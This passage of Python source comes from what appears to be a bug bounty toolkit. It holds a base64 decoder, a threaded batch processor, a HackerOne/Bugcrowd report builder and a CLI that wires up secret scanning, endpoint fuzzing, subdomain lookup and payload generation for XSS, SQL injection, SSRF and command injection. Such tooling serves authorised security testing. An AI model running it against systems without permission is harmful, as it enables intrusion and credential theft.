        """Try to decode bytes as UTF-8, fall back to latin-1."""
        try:
            return data.decode("utf-8")
        except UnicodeDecodeError:
            try:
                return data.decode("latin-1")
            except Exception:
                return repr(data)

    def decode_all_variants(self, data: Optional[str] = None) -> Dict[str, Any]:
        """
        Try all base64 variants and return results.

        Variants tested:
        - Standard with padding
        - Standard without padding
        - URL-safe with padding
        - URL-safe without padding
        - MIME base64 (with newlines)

        Args:
            data: The string to decode. Falls back to input_string.

        Returns:
            Dict mapping variant name -> decoded result dict.
        """
        target = data or self.input_string
        if not target:
            return {"error": "No input provided"}

        results: Dict[str, Any] = {}
        variants = {
            "standard": (target, self.decode_standard),
            "standard_nopad": (target.rstrip("="), self.decode_standard),
            "urlsafe": (target.replace("+", "-").replace("/", "_"), self.decode_urlsafe),
            "urlsafe_nopad": (target.replace("+", "-").replace("/", "_").rstrip("="), self.decode_urlsafe),
        }

        for name, (variant_data, decoder) in variants.items():
            success, result = decoder(variant_data)
            if success and isinstance(result, bytes):
                text = self._try_decode_as_text(result)
                results[name] = {
                    "success": True,
                    "decoded_text": text,
                    "length": len(text),
                    "is_text": isinstance(text, str) and not text.startswith("b'"),
                    "content_type": self._detect_content_type(text),
                }
            else:
                results[name] = {
                    "success": False,
                    "error": str(result) if not success else "unknown error",
                }

        self.decoded_results = results
        return results

    def _detect_content_type(self, decoded: str) -> str:
        """
        Heuristically detect the content type of decoded text.

        Args:
            decoded: The decoded text string.

        Returns:
            String describing the likely content type (json, html, url, jwt, text, binary).
        """
        if not decoded:
            return "empty"

        for content_type, patterns in self.CONTENT_PATTERNS.items():
            if any(p.search(decoded) for p in patterns):
                return content_type

        # Check for readable text ratio
        printable = sum(1 for c in decoded if c.isprintable() or c in "\n\r\t")
        ratio = printable / max(len(decoded), 1)

        if ratio > 0.9:
            return "text"
        elif ratio > 0.5:
            return "semi_binary"
        else:
            return "binary"

    def decode_jwt_segments(self, token: str) -> Dict[str, Any]:
        """
        Decode the header and payload segments of a JWT.

        Convenience method wrapping decode_jwt().

        Args:
            token: JWT string.

        Returns:
            Dict with decoded header and payload.
        """
        return decode_jwt(token)

    def recursive_decode(self, data: str, max_depth: int = 5) -> List[Dict[str, Any]]:
        """
        Recursively decode nested base64.

        Decodes, checks if the result is itself base64, and decodes again.

        Args:
            data: The base64 string to decode.
            max_depth: Maximum recursion depth.

        Returns:
            List of decoding steps, each with depth, variant, and result.
        """
        steps = []
        current = data
        depth = 0

        while depth < max_depth:
            if not self.is_base64(current):
                break

            results = self.decode_all_variants(current)
            best = None
            for name, r in results.items():
                if r.get("success"):
                    best = r
                    steps.append({
                        "depth": depth,
                        "input_preview": current[:80],
                        "variant": name,
                        "decoded_preview": r.get("decoded_text", "")[:200],
                        "content_type": r.get("content_type", "unknown"),
                    })
                    current = r.get("decoded_text", "")
                    break

            if not best:
                break
            depth += 1

        return steps

    def find_encoded_strings(self, text: str, min_length: int = 20) -> List[Dict[str, Any]]:
        """
        Find potential base64-encoded strings within larger text.

        Scans text for sequences that look like base64 and attempts decoding.

        Args:
            text: The text to search.
            min_length: Minimum length of potential base64 strings.

        Returns:
            List of findings with position, encoded string, and decoded result.
        """
        # Find sequences of base64-like characters
        potential = re.findall(r'[A-Za-z0-9+/=_-]{' + str(min_length) + r',}', text)
        findings = []

        for encoded in potential:
            if self.is_base64(encoded):
                result = self.decode_all_variants(encoded)
                best = next(
                    (r for r in result.values() if r.get("success")),
                    None
                )
                if best:
                    findings.append({
                        "encoded": encoded[:100],
                        "decoded": best.get("decoded_text", "")[:200],
                        "content_type": best.get("content_type", "unknown"),
                        "variant": best.get("variant", ""),
                    })

        return findings

    def get_best_decoding(self) -> Optional[Dict[str, Any]]:
        """
        Get the most likely correct decoding from all variants tested.

        Prioritizes by: success, content type (json > html > text > binary),
        and decoded length reasonability.

        Returns:
            Best result dict, or None if no successful decoding.
        """
        if not self.decoded_results:
            self.decode_all_variants()

        successful = [
            (name, r) for name, r in self.decoded_results.items()
            if r.get("success")
        ]

        if not successful:
            return None

        # Priority: json > jwt > html > url > text > semi_binary > binary
        priority = {"json": 6, "jwt": 5, "html": 4, "url": 3, "text": 2, "semi_binary": 1, "binary": 0}

        def sort_key(item):
            _, r = item
            return priority.get(r.get("content_type", "binary"), 0)

        best = max(successful, key=sort_key)
        return {"variant": best[0], **best[1]}


# ═══════════════════════════════════════════════════════════════════════════════
# CLASS: BatchProcessor
# ═══════════════════════════════════════════════════════════════════════════════

class BatchProcessor:
    """
    Process multiple files or URLs in parallel with rate limiting and progress.

    Features:
    - ThreadPoolExecutor for parallel execution
    - Configurable rate limiting (delay between requests)
    - Progress tracking with callbacks
    - Structured output (JSON/CSV)
    - Error handling per item (doesn't stop on individual failures)

    Attributes:
        items: List of items to process.
        worker_func: Function to apply to each item.
        max_workers: Maximum concurrent threads.
        rate_limit: Delay in seconds between items (per-thread).
        results: List of processed results.
    """

    def __init__(
        self,
        items: Optional[List[Any]] = None,
        worker_func: Optional[Callable] = None,
        max_workers: int = 10,
        rate_limit: float = 0.1,
        progress_callback: Optional[Callable] = None,
    ):
        """
        Initialize BatchProcessor.

        Args:
            items: List of items to process.
            worker_func: Function that takes one item and returns a result.
            max_workers: Maximum concurrent threads.
            rate_limit: Seconds to wait between items (per thread).
            progress_callback: Optional callback function(completed, total, item).
        """
        self.items = items or []
        self.worker_func = worker_func
        self.max_workers = max(max_workers, 1)
        self.rate_limit = max(rate_limit, 0)
        self.progress_callback = progress_callback
        self.results: List[Dict[str, Any]] = []
        self.errors: List[Dict[str, Any]] = []
        self.start_time: float = 0.0
        self.end_time: float = 0.0

    def set_items(self, items: List[Any]) -> None:
        """Set the list of items to process."""
        self.items = items

    def set_worker(self, func: Callable) -> None:
        """Set the worker function."""
        self.worker_func = func

    def _worker_wrapper(self, item: Any, idx: int, total: int) -> Dict[str, Any]:
        """
        Wrapper that applies rate limiting and error handling.

        Args:
            item: The item to process.
            idx: Item index for tracking.
            total: Total item count.

        Returns:
            Dict with 'index', 'item', 'result' or 'error'.
        """
        try:
            if self.rate_limit > 0:
                time.sleep(self.rate_limit)

            result = self.worker_func(item) if self.worker_func else None

            if self.progress_callback:
                self.progress_callback(idx + 1, total, item)

            return {
                "index": idx,
                "item": item,
                "success": True,
                "result": result,
            }
        except Exception as e:
            error_info = {
                "index": idx,
                "item": item,
                "success": False,
                "error": str(e),
                "error_type": type(e).__name__,
            }
            if self.progress_callback:
                self.progress_callback(idx + 1, total, item, error=str(e))
            return error_info

    def execute(self) -> List[Dict[str, Any]]:
        """
        Execute batch processing with ThreadPoolExecutor.

        Returns:
            List of result dicts with success/error status.
        """
        if not self.items:
            print("[!] No items to process.", file=sys.stderr)
            return []

        if not self.worker_func:
            print("[!] No worker function set.", file=sys.stderr)
            return []

        total = len(self.items)
        self.start_time = time.time()
        self.results = []
        self.errors = []

        print(f"[+] Processing {total} items with {self.max_workers} workers...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [
                executor.submit(self._worker_wrapper, item, idx, total)
                for idx, item in enumerate(self.items)
            ]

            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result(timeout=300)
                    self.results.append(result)
                    if not result.get("success"):
                        self.errors.append(result)
                except concurrent.futures.TimeoutError:
                    self.results.append({
                        "index": -1,
                        "item": None,
                        "success": False,
                        "error": "Timeout (> 300s)",
                    })

        # Sort by index to maintain original order
        self.results.sort(key=lambda x: x.get("index", -1))

        self.end_time = time.time()
        elapsed = self.end_time - self.start_time
        success_count = sum(1 for r in self.results if r.get("success"))
        error_count = sum(1 for r in self.results if not r.get("success"))

        print(f"[+] Completed: {success_count} succeeded, {error_count} failed in {elapsed:.1f}s")

        return self.results

    def get_successful(self) -> List[Any]:
        """Get only successful results."""
        return [r.get("result") for r in self.results if r.get("success")]

    def get_errors(self) -> List[Dict[str, Any]]:
        """Get only error results."""
        return [r for r in self.results if not r.get("success")]

    def output_json(self, filepath: str) -> None:
        """
        Write results to JSON file.

        Args:
            filepath: Output file path.
        """
        output = {
            "summary": self.get_summary(),
            "results": self.results,
            "errors": self.errors,
        }
        os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(output, f, indent=2, default=str)
        print(f"[+] Results written to {filepath}")

    def output_csv(self, filepath: str, fields: Optional[List[str]] = None) -> None:
        """
        Write results to CSV file.

        Args:
            filepath: Output CSV file path.
            fields: List of result fields to include as columns. If None, auto-detect.
        """
        if not self.results:
            return

        os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
        with open(filepath, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)

            if fields is None:
                # Auto-detect fields from first successful result
                for r in self.results:
                    if r.get("success") and isinstance(r.get("result"), dict):
                        fields = list(r["result"].keys())
                        break
                if fields is None:
                    fields = ["index", "item", "success"]

            writer.writerow(fields)
            for r in self.results:
                if r.get("success") and isinstance(r.get("result"), dict):
                    row = [r.get("result", {}).get(f, "") for f in fields]
                else:
                    row = [r.get("item", ""), r.get("error", "")]
                writer.writerow(row)

        print(f"[+] Results written to {filepath}")

    def get_summary(self) -> Dict[str, Any]:
        """
        Get execution summary.

        Returns:
            Dict with timing, success/error counts.
        """
        elapsed = self.end_time - self.start_time if self.end_time else 0
        success_count = sum(1 for r in self.results if r.get("success"))
        error_count = sum(1 for r in self.results if not r.get("success"))

        return {
            "total": len(self.items),
            "processed": len(self.results),
            "succeeded": success_count,
            "failed": error_count,
            "elapsed_seconds": round(elapsed, 2),
            "rate_per_second": round(success_count / max(elapsed, 0.01), 2),
            "max_workers": self.max_workers,
            "rate_limit": self.rate_limit,
        }


# ═══════════════════════════════════════════════════════════════════════════════
# CLASS: ReportBuilder
# ═══════════════════════════════════════════════════════════════════════════════

class ReportBuilder:
    """
    Generate formatted bug bounty finding reports with CVSS scoring.

    Features:
    - Markdown report generation
    - CVSS 3.1 vector builder
    - Evidence formatting (code blocks, HTTP requests/responses)
    - Platform-specific templates (HackerOne, Bugcrowd, generic)
    - Summary table generation
    - Export to file

    Attributes:
        findings: List of finding dicts.
        platform: Target platform ('hackerone', 'bugcrowd', 'generic').
    """

    # CVSS 3.1 metric options
    CVSS_METRICS = {
        "AV": {"N": "Network", "A": "Adjacent", "L": "Local", "P": "Physical"},
        "AC": {"L": "Low", "H": "High"},
        "PR": {"N": "None", "L": "Low", "H": "High"},
        "UI": {"N": "None", "R": "Required"},
        "S": {"U": "Unchanged", "C": "Changed"},
        "C": {"H": "High", "L": "Low", "N": "None"},
        "I": {"H": "High", "L": "Low", "N": "None"},
        "A": {"H": "High", "L": "Low", "N": "None"},
    }

    # Severity color mapping
    SEVERITY_COLORS = {
        "critical": "#e74c3c",
        "high": "#e67e22",
        "medium": "#f1c40f",
        "low": "#3498db",
        "info": "#95a5a6",
        "none": "#bdc3c7",
    }

    def __init__(self, platform: str = "generic"):
        """
        Initialize ReportBuilder.

        Args:
            platform: Target platform ('hackerone', 'bugcrowd', 'generic').
        """
        self.platform = platform.lower()
        self.findings: List[Dict[str, Any]] = []

    def add_finding(self, finding: Dict[str, Any]) -> None:
        """
        Add a finding to the report.

        Args:
            finding: Dict with keys:
                - title (str)
                - severity (str): critical/high/medium/low/info
                - description (str)
                - impact (str)
                - reproduction_steps (str or list)
                - evidence (str)
                - remediation (str)
                - references (list of str)
                - cvss_vector (str): e.g. "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                - cwe_id (str): e.g. "CWE-200"
        """
        required = {"title", "severity", "description"}
        missing = required - set(finding.keys())
        if missing:
            print(f"[!] Finding missing required keys: {missing}", file=sys.stderr)

        self.findings.append(finding)

    def build_cvss_vector(self, metrics: Dict[str, str]) -> str:
        """
        Build a CVSS 3.1 vector string from metric dict.

        Args:
            metrics: Dict of metric abbreviations -> values.
                     e.g. {"AV": "N", "AC": "L", "PR": "N", "UI": "N",
                           "S": "U", "C": "H", "I": "N", "A": "N"}

        Returns:
            CVSS vector string or error message.

        Example:
            >>> rb = ReportBuilder()
            >>> rb.build_cvss_vector({"AV": "N", "AC": "L", "PR": "N", "UI": "N",
            ...                        "S": "U", "C": "H", "I": "N", "A": "N"})
            'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N'
        """
        required = ["AV", "AC", "PR", "UI", "S", "C", "I", "A"]
        for key in required:
            if key not in metrics:
                return f"Error: Missing required metric '{key}'"
            if metrics[key] not in self.CVSS_METRICS[key]:
                valid = list(self.CVSS_METRICS[key].keys())
                return f"Error: Invalid value '{metrics[key]}' for '{key}'. Valid: {valid}"

        vector = "CVSS:3.1/" + "/".join(f"{k}:{metrics[k]}" for k in required)
        return vector

    def explain_cvss(self, vector: str) -> str:
        """
        Explain a CVSS 3.1 vector string in human-readable terms.

        Args:
            vector: CVSS vector string.

        Returns:
            Human-readable explanation.
        """
        if not vector.startswith("CVSS:3.1/"):
            return "Unsupported CVSS version"

        parts = vector.replace("CVSS:3.1/", "").split("/")
        explanations = []

        for part in parts:
            if ":" not in part:
                continue
            key, val = part.split(":", 1)
            if key in self.CVSS_METRICS and val in self.CVSS_METRICS[key]:
                explanations.append(f"{key}: {self.CVSS_METRICS[key][val]}")

        return "; ".join(explanations) if explanations else "Could not parse vector."

    def _format_evidence(self, evidence: str) -> str:
        """
        Format evidence for markdown output.

        Wraps content in appropriate code blocks and handles
        HTTP request/response formatting.

        Args:
            evidence: Raw evidence text.

        Returns:
            Formatted markdown string.
        """
        if not evidence:
            return "_No evidence provided_"

        lines = evidence.split("\n")

        # Detect HTTP request/response
        is_http = any(
            line.startswith(("GET ", "POST ", "PUT ", "PATCH ", "DELETE ", "HTTP/"))
            for line in lines[:5]
        )

        if is_http:
            return "```http\n" + evidence + "\n```"

        # Detect JSON
        try:
            json.loads(evidence)
            formatted = json.dumps(json.loads(evidence), indent=2)
            return "```json\n" + formatted + "\n```"
        except (json.JSONDecodeError, ValueError):
            pass

        # Default to plain text block if multiline
        if len(lines) > 1:
            return "```\n" + evidence + "\n```"

        return evidence

    def _severity_badge(self, severity: str) -> str:
        """Generate a markdown severity badge."""
        severity = severity.lower()
        color = self.SEVERITY_COLORS.get(severity, "#95a5a6")
        return f"![{severity}](https://img.shields.io/badge/{severity}-{color.lstrip('#')})"

    def generate_markdown(self, title: str = "Bug Bounty Report") -> str:
        """
        Generate a complete markdown report from all findings.

        Args:
            title: Report title.

        Returns:
            Formatted markdown string.
        """
        if not self.findings:
            return "# No Findings\n\n_No findings to report._"

        sections = [
            f"# {title}",
            "",
            f"**Platform:** {self.platform.title()}",
            f"**Date:** {datetime.now().strftime('%Y-%m-%d')}",
            f"**Findings:** {len(self.findings)}",
            "",
            "---",
            "",
            "## Summary",
            "",
            "| # | Title | Severity | CWE | CVSS |",
            "|---|-------|----------|-----|------|",
        ]

        for i, finding in enumerate(self.findings, 1):
            cwe = finding.get("cwe_id", "N/A")
            cvss = finding.get("cvss_vector", "N/A")
            if cvss and len(cvss) > 30:
                cvss = cvss[:30] + "..."
            badge = self._severity_badge(finding.get("severity", "info"))
            sections.append(
                f"| {i} | {finding.get('title', 'Untitled')} | {badge} | {cwe} | `{cvss}` |"
            )

        sections += ["", "---", "", "## Findings", ""]

        for i, finding in enumerate(self.findings, 1):
            sections.append(f"### {i}. {finding.get('title', 'Untitled')}")
            sections.append("")
            sections.append(f"**Severity:** {self._severity_badge(finding.get('severity', 'info'))}")
            sections.append("")
            sections.append(f"**CWE:** {finding.get('cwe_id', 'N/A')}")
            sections.append("")
            if finding.get("cvss_vector"):
                sections.append(f"**CVSS Vector:** `{finding['cvss_vector']}`")
                sections.append("")
                sections.append(f"**CVSS Explanation:** {self.explain_cvss(finding['cvss_vector'])}")
                sections.append("")

            sections.append("#### Description")
            sections.append("")
            sections.append(finding.get("description", "_No description_"))
            sections.append("")

            sections.append("#### Impact")
            sections.append("")
            sections.append(finding.get("impact", "_No impact stated_"))
            sections.append("")

            steps = finding.get("reproduction_steps", "")
            sections.append("#### Steps to Reproduce")
            sections.append("")
            if isinstance(steps, list):
                for j, step in enumerate(steps, 1):
                    sections.append(f"{j}. {step}")
            else:
                sections.append(steps if steps else "_No steps provided_")
            sections.append("")

            sections.append("#### Evidence")
            sections.append("")
            sections.append(self._format_evidence(finding.get("evidence", "")))
            sections.append("")

            sections.append("#### Remediation")
            sections.append("")
            sections.append(finding.get("remediation", "_No remediation provided_"))
            sections.append("")

            if finding.get("references"):
                sections.append("#### References")
                sections.append("")
                for ref in finding["references"]:
                    sections.append(f"- [{ref}]({ref})")
                sections.append("")

            sections.append("---")
            sections.append("")

        return "\n".join(sections)

    def generate_hackerone_template(self, finding: Dict[str, Any]) -> str:
        """
        Generate a HackerOne-format report for a single finding.

        Format matches H1's expected sections: Summary, Steps To Reproduce,
        Impact, Supporting Material/Evidence.

        Args:
            finding: Single finding dict.

        Returns:
            HackerOne-formatted report string.
        """
        templates = {
            "title": finding.get("title", "Security Vulnerability Report"),
            "summary": finding.get("description", ""),
            "severity": finding.get("severity", "medium").title(),
            "impact": finding.get("impact", ""),
            "steps": "",
            "evidence": finding.get("evidence", ""),
        }

        steps = finding.get("reproduction_steps", "")
        if isinstance(steps, list):
            templates["steps"] = "\n".join(f"{i}. {s}" for i, s in enumerate(steps, 1))
        else:
            templates["steps"] = steps

        report = f"""## Summary

{templates['summary']}

## Severity

{templates['severity']}

## Steps To Reproduce

{templates['steps']}

## Impact

{templates['impact']}

## Supporting Material / Evidence

```
{templates['evidence']}
```
"""
        return report

    def generate_bugcrowd_template(self, finding: Dict[str, Any]) -> str:
        """
        Generate a Bugcrowd-format report for a single finding.

        Uses Bugcrowd's VRT-friendly structure with severity request
        and OOS-clause framing.

        Args:
            finding: Single finding dict.

        Returns:
            Bugcrowd-formatted report string.
        """
        severity_statement = {
            "critical": "This issue enables a direct compromise of the application or its users without user interaction.",
            "high": "This issue allows significant compromise of data integrity, confidentiality, or availability.",
            "medium": "This issue impacts the security posture in a limited but meaningful way.",
            "low": "This issue has minimal security impact but represents a best-practice violation.",
            "info": "Informational observation with no direct security impact.",
        }

        severity = finding.get("severity", "medium").lower()
        cvss = finding.get("cvss_vector", "")
        vector_explanation = self.explain_cvss(cvss) if cvss else ""

        report = f"""## Vulnerability Description

{finding.get('description', '')}

## Severity Justification

{severity_statement.get(severity, '')}

"""

        if cvss:
            report += f"""## CVSS Vector

{cvss}

{vector_explanation}

"""

        report += f"""## Steps to Reproduce

"""
        steps = finding.get("reproduction_steps", "")
        if isinstance(steps, list):
            report += "\n".join(f"{i}. {s}" for i, s in enumerate(steps, 1))
        else:
            report += steps

        if finding.get("evidence"):
            report += f"""
## Proof of Concept / Evidence

```
{finding['evidence']}
```
"""

        report += f"""
## Impact

{finding.get('impact', '')}

## Remediation Recommendation

{finding.get('remediation', '')}
"""
        return report

    def save(self, filepath: str, title: str = "Bug Bounty Report") -> str:
        """
        Generate and save report to a markdown file.

        Args:
            filepath: Path to save the report.
            title: Report title.

        Returns:
            Generated markdown content.
        """
        markdown = self.generate_markdown(title)
        os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(markdown)
        print(f"[+] Report saved to {filepath}")
        return markdown


# ═══════════════════════════════════════════════════════════════════════════════
# CLI DISPATCH
# ═══════════════════════════════════════════════════════════════════════════════

def print_banner() -> None:
    """Print the tool banner."""
    print(HEADER_BANNER)


def print_usage() -> None:
    """Print usage information for CLI mode."""
    print("""
Usage:
    python python-hunter.py [options]

Options:
    --analyze-js <url|file>     Analyze a JavaScript bundle
    --scan-secrets <path>       Scan file/directory for secrets
    --collect-urls <url>        Collect URLs from a webpage
    --fuzz <url>                Generate endpoint fuzzing variants
    --decode-b64 <string>       Decode base64 variants
    --decode-jwt <token>        Decode JWT token (no verification)
    --payloads <class>          Generate test payloads (xss/ssti/sqli/ssrf/command-injection)
    --crt <domain>              Query crt.sh for subdomains
    --hash <file>               Calculate file hash (sha256)
    --scope <domain>            Scope domain (use with --collect-urls)
    --output <dir>              Output directory (default: ./hunter_output)
    --report <file>             Generate report from findings.json
    --help                      Show this help message

Examples:
    python python-hunter.py --analyze-js https://target.com/app.js
    python python-hunter.py --scan-secrets ./src --scope *.target.com
    python python-hunter.py --collect-urls https://target.com --scope target.com
    python python-hunter.py --decode-jwt eyJhbGciOiJIUzI1NiJ9...
    python python-hunter.py --payloads xss
    python python-hunter.py --crt target.com
    python python-hunter.py --hash /etc/passwd
""")


def main() -> None:
    """Main entry point for CLI usage."""
    print_banner()

    args = sys.argv[1:]
    if not args or "--help" in args:
        print_usage()
        return

    # Parse output directory
    output_dir = CONFIG["output_dir"]
    if "--output" in args:
        idx = args.index("--output")
        if idx + 1 < len(args):
            output_dir = args[idx + 1]
    os.makedirs(output_dir, exist_ok=True)

    # Parse scope
    scope_domains: List[str] = []
    if "--scope" in args:
        idx = args.index("--scope")
        while idx + 1 < len(args) and not args[idx + 1].startswith("--"):
            scope_domains.append(args[idx + 1])
            idx += 1

    # ── Analyze JS ─────────────────────────────────────────────────────
    if "--analyze-js" in args:
        idx = args.index("--analyze-js")
        if idx + 1 < len(args):
            source = args[idx + 1]
            analyzer = JSAnalyzer(source_url=source)
            results = analyzer.analyze_all()
            report_path = os.path.join(output_dir, "js_analysis.json")
            analyzer.output_json(report_path)
            print(f"\n[+] JS Analysis Summary:")
            print(f"    Endpoints: {len(results.get('endpoints', []))}")
            print(f"    Secrets: {len(results.get('secrets', []))}")
            print(f"    Feature Flags: {len(results.get('feature_flags', []))}")
            print(f"    Internal Endpoints: {len(results.get('internal_endpoints', []))}")
        else:
            print("[!] --analyze-js requires a URL or file path")

    # ── Scan Secrets ───────────────────────────────────────────────────
    if "--scan-secrets" in args:
        idx = args.index("--scan-secrets")
        if idx + 1 < len(args):
            path = args[idx + 1]
            scanner = SecretScanner()
            if os.path.isfile(path):
                findings = scanner.scan_file(path)
            elif os.path.isdir(path):
                findings = scanner.scan_directory(path)
            else:
                print(f"[!] Path not found: {path}", file=sys.stderr)
                findings = []

            summary = scanner.get_summary()
            print(f"\n[+] Secret Scan Summary:")
            print(f"    Total: {summary['total_findings']}")
            print(f"    High Confidence: {summary['confidence_high']}")
            print(f"    Medium Confidence: {summary['confidence_medium']}")
            print(f"    Low Confidence: {summary['confidence_low']}")
            print(f"    By Type:")
            for secret_type, count in summary.get("by_type", {}).items():
                print(f"      {secret_type}: {count}")

            report_path = os.path.join(output_dir, "secrets.json")
            with open(report_path, "w", encoding="utf-8") as f:
                json.dump(findings, f, indent=2, default=str)
            print(f"[+] Secrets saved to {report_path}")
        else:
            print("[!] --scan-secrets requires a file or directory path")

    # ── Collect URLs ───────────────────────────────────────────────────
    if "--collect-urls" in args:
        idx = args.index("--collect-urls")
        if idx + 1 < len(args):
            url = args[idx + 1]
            collector = URLCollector()
            if scope_domains:
                collector.set_scope(scope_domains)
            if collector.fetch(url):
                urls = collector.extract_urls_from_html()
                report_path = os.path.join(output_dir, "urls.csv")
                collector.output_csv(report_path)
                json_path = os.path.join(output_dir, "urls.json")
                with open(json_path, "w", encoding="utf-8") as f:
                    json.dump(collector.get_sorted_urls(), f, indent=2)

                print(f"\n[+] URL Collection Summary:")
                print(f"    Total Unique: {len(urls)}")
                print(f"    By Domain:")
                for domain, domain_urls in collector.group_by_domain().items():
                    print(f"      {domain}: {len(domain_urls)} URL(s)")
        else:
            print("[!] --collect-urls requires a URL")

    # ── Fuzz Endpoint ──────────────────────────────────────────────────
    if "--fuzz" in args:
        idx = args.index("--fuzz")
        if idx + 1 < len(args):
            url = args[idx + 1]
            fuzzer = EndpointFuzzer(base_url=url)
            variants = fuzzer.generate_all_variants()
            summary = fuzzer.get_summary()

            report_path = os.path.join(output_dir, "fuzz_variants.json")
            with open(report_path, "w", encoding="utf-8") as f:
                json.dump(variants, f, indent=2, default=str)

            print(f"\n[+] Fuzzing Variants Generated:")
            print(f"    Total: {summary['total_variants']}")
            print(f"    Methods: {', '.join(summary['methods'])}")
            print(f"    Unique Params: {summary['unique_params_tested']}")
            print(f"    Param Variants: {summary['param_permutations']}")
            print(f"    Method Overrides: {summary['method_overrides']}")
            print(f"    Output: {report_path}")
        else:
            print("[!] --fuzz requires a URL")

    # ── Decode Base64 ──────────────────────────────────────────────────
    if "--decode-b64" in args:
        idx = args.index("--decode-b64")
        if idx + 1 < len(args):
            b64 = args[idx + 1]
            toolkit = Base64Toolkit(b64)
            results = toolkit.decode_all_variants()
            best = toolkit.get_best_decoding()

            print(f"\n[+] Base64 Decoding Results:")
            for variant, result in results.items():
                status = "✓" if result.get("success") else "✗"
                preview = result.get("decoded_text", result.get("error", ""))[:100]
                print(f"    {status} {variant}: {preview}")

            if best and best.get("success"):
                print(f"\n    Best: {best['variant']} -> {best.get('content_type', '?')}")
                print(f"    Full: {best.get('decoded_text', '')[:500]}")
        else:
            print("[!] --decode-b64 requires a base64 string")

    # ── Decode JWT ─────────────────────────────────────────────────────
    if "--decode-jwt" in args:
        idx = args.index("--decode-jwt")
        if idx + 1 < len(args):
            token = args[idx + 1]
            decoded = decode_jwt(token)
            print(f"\n[+] JWT Decoded:")
            print(f"    Header:  {json.dumps(decoded.get('header', {}), indent=2)}")
            print(f"    Payload: {json.dumps(decoded.get('payload', {}), indent=2)}")
        else:
            print("[!] --decode-jwt requires a token")

    # ── Generate Payloads ──────────────────────────────────────────────
    if "--payloads" in args:
        idx = args.index("--payloads")
        if idx + 1 < len(args):
            bug_class = args[idx + 1]
            payloads = generate_payloads(bug_class)
            print(f"\n[+] Payloads for '{bug_class}' ({len(payloads)}):")
            for i, p in enumerate(payloads, 1):
                print(f"    {i}. {p[:120]}")
        else:
            print("[!] --payloads requires a bug class (xss/ssti/sqli/ssrf/command-injection)")

    # ── CRT.sh Query ───────────────────────────────────────────────────
    if "--crt" in args:
        idx = args.index("--crt")
        if idx + 1 < len(args):
            domain = args[idx + 1]
            print(f"[+] Querying crt.sh for {domain}...")
            domains = extract_domains_from_crt(domain)
            print(f"\n[+] Found {len(domains)} subdomains:")
            for d in domains:
                print(f"    {d}")

            report_path = os.path.join(output_dir, f"crt_{domain}.txt")
            with open(report_path, "w", encoding="utf-8") as f:
                f.write("\n".join(domains))
            print(f"[+] Subdomains saved to {report_path}")
        else:
            print("[!] --crt requires a domain name")

    # ── Hash File ──────────────────────────────────────────────────────
    if "--hash" in args:
        idx = args.index("--hash")
        if idx + 1 < len(args):
            filepath = args[idx + 1]
            if os.path.isfile(filepath):
                sha256 = calculate_hash(filepath, "sha256")
                md5 = calculate_hash(filepath, "md5")
                print(f"\n[+] File Hash: {filepath}")
                print(f"    SHA256: {sha256}")
                print(f"    MD5:    {md5}")
            else:
                print(f"[!] File not found: {filepath}", file=sys.stderr)
        else:
            print("[!] --hash requires a file path")

    # ── Generate Report ────────────────────────────────────────────────
    if "--report" in args:
        idx = args.index("--report")
        if idx + 1 < len(args):
            findings_file = args[idx + 1]
            if os.path.isfile(findings_file):
                with open(findings_file, "r", encoding="utf-8") as f:
                    findings_data = json.load(f)

                builder = ReportBuilder(platform="hackerone")
                if isinstance(findings_data, list):
                    for finding in findings_data:
                        builder.add_finding(finding)
                elif isinstance(findings_data, dict):
                    builder.add_finding(findings_data)

                report_path = os.path.join(output_dir, "report.md")
                builder.save(report_path)
            else:
                print(f"[!] Findings file not found: {findings_file}", file=sys.stderr)

    # ── Implicit mode: no specific flag matched ────────────────────────
    if not any(flag in args for flag in [
        "--analyze-js", "--scan-secrets", "--collect-urls", "--fuzz",
        "--decode-b64", "--decode-jwt", "--payloads", "--crt", "--hash",
        "--report", "--help"
    ]):
        print_usage()


if __name__ == "__main__":
    main()
